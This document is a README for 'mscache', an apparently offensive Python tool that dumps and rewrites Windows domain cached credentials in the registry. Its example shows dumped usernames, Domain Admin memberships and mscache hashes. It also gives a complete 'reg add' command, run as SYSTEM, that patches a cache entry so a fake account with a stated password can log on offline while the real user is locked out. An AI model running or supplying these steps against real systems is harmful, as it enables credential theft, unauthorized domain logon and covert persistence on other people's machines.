# mscache
a tool to manipulate dcc(domain cached credentials) in windows registry, based mainly on the work of mimikatz and impacket

# requirements
* python2
* pycrypto
* passlib
* impacket


# example

```
> python mscache.py --security security --system system
dumping domain cached credentials
# reg query "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "NL$1"
# 2018-08-22 06:27:58
        username: subuser <subuser@sub.ateam.com>
        domain groups: 513<Domain Users>, 512<Domain Admins>
        mscache hash: a95c530a7af5f492a74499e70578d150
        domain: SUB, SUB.ATEAM.COM
        effective name: subuser
        full name:
        logon script:
        profile path:
        home:
        home drive:
        checksum: 0b3af2a9bc12d0470933ce21fc67ce77
        IV: cbc8bebf41c2248221f7dc898443af19

# reg query "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "NL$2"
# 2018-08-22 06:29:23
        username: testmscache <testmscache@ateam.com>
        domain groups: 512<Domain Admins>, 513<Domain Users>
        mscache hash: 1e1f82203bb51ca52fbedfa8de07555e
        domain: ATEAM, ATEAM.COM
        effective name: testmscache
        full name:
        logon script:
        profile path:
        home:
        home drive:
        checksum: b5e8053cda60c633c8eafaac844c982d
        IV: fac7ca2ccdcb7ef2f88bb1d36eaf709b

> python mscache.py --security security --system system --patch subuser
execute as SYSTEM on target:
    reg add "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "NL$1" /t REG_BINARY /d 1000080010000000000000000000000052040000010200000200000008001800f1650745e139d401040001000200000001000a00300000001000000010002200cbc8bebf41c2248221f7dc898443af19754b0980c9266f6bf785ee795238f60eb5393a6509de4e5fea5e6adb70ff3c51b08dd29b7c5db1ae555876324458f73747c37da86509605305029838319d6adf5da9b01af23cea23934c0f59bd840557515f2b069694a6dee7d55c480df4d9a98664a8c823eaccfab9f3191668fbbd1584f4cc45ffd3026e46eb0a84e8484134524eba9d17920543947d4229b765d2c6c9344dc39f151019efcf3fb9a9b4a03cd4f1a886df81fc5359c719587f919b5e6f52249a3878603b57a32a4df81679ab763c4c00a6913d8d14be44b1b28084a02aa3ca93c91759ac0821ff8918f9db2a7f7b1c21e8c9608f3475fec51a60c2d27e509041a428ef4230018f7c15513c8a30768da63c1b406f5112c2edafa085986d3f3b389e6906553c29b36d242de650 /f

user being patched:
    subuser
    * this user will no longer be able to logon when there is no contact with DC. When there is, this user can logon without problems

logon information:
    username: FAKE\fakeuser
    password: n1nty@360 A-TEAM
    * you can logon with credential above when there is !!!no contact with DC!!!. When there is, you can't do that
```
